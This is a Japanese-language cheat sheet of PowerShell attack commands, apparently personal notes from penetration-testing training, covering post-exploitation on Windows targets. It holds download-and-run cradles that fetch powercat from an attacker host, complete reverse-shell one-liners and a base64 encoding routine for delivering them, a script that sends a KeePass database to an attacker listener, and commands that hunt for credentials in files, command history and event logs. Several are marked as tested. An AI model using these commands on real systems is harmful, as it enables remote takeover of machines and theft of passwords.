## 現在の実行環境がコマンドプロンプトかPowerShellかをチェック
```.ps1
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```

## 攻撃者のマシンからリバースシェルのスクリプトをダウンロードして実行する
```.ps1
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c <attacker IP> -p 4444 -e powershell
```

## Kali上でPowershell用のリバースシェルを生成してbase64エンコードのまま送信後、デコード・実行させる

1. パワーシェルをKali上で起動
```
pwsh
```

2. Powershellのリバースシェル用コマンドをText変数に入れる
```.ps1
$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
```

3. 
```.ps1
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
```

4. エンコードする
```.ps1
$EncodedText =[Convert]::ToBase64String($Bytes)
```

5. base64エンコードした文字列をターミナルに出力する
```.ps1
$EncodedText
```

6. ターゲット上でエンコードしたPowershellのリバースシェルコマンドをデコードさせて実行する
```.ps1
powershell%20-enc%20<先ほどの出力された$EncodedTextの内容>
```

7. Windowsターゲット上で、C:\配下の全ファイルを列挙。このケースでは.kdbxの拡張子のファイルを列挙
```
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

8. Attackerマシンからpowercatを取得して実行し、リバースシェルを取る
```
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.243/powercat.ps1');powercat -c 192.168.45.243 -p 4444 -e cmd"
```

9. 単純なリバースシェルコマンドで、コマンドプロンプトから実行させると動くのを確認済み
```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.45.243',4444);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

10. Kali側でncを使ってデータをレシーブ状態にさせて、データをPowershell側から送信する。動作検証済み
```
$content = Get-Content 'Database.kdbx' -Raw
$socket = New-Object System.Net.Sockets.TcpClient('192.168.45.243', 9999)
$stream = $socket.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$writer.Write($content)
$writer.Flush()
$writer.Close()
$socket.Close()
```

11. Windows環境のローカルユーザを列挙する
```
Get-LocalUser
```

12. paulがローカルのどのグループのメンバーであるかを確認する
```
net user paul
```

13. ホスト上の既存のグループを列挙する
```
Get-LocalGroup
```

14. adminteamというローカルグループのメンバーを確認する
```
Get-LocalGroupMember adminteam
```

15. インストールされているすべてのアプリケーションを列挙する
```
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

16. 実行中のアプリケーションを一覧表示する
```
Get-Process
```

17. 認証情報が置かれてそうなファイルをすべて列挙
```
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

18. 過去に実行されたコマンドのリストを取得する
```
Get-History
```

19. PSReadlineモジュールからPowerShellの実行履歴を取得したファイルパスを出力する(PSReadlineというモジュールによってコマンド履歴が記録されるが、これはClear-Historyコマンドでは削除されない)
```
(Get-PSReadlineOption).HistorySavePath
```

19. passというキーワードで、windows上のイベントビューアから平文のパスワードがPowerShell経由で実行されていないか、スクリプトブロックログを検索する
```
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | Where-Object { $_.Message -match "pass" }
```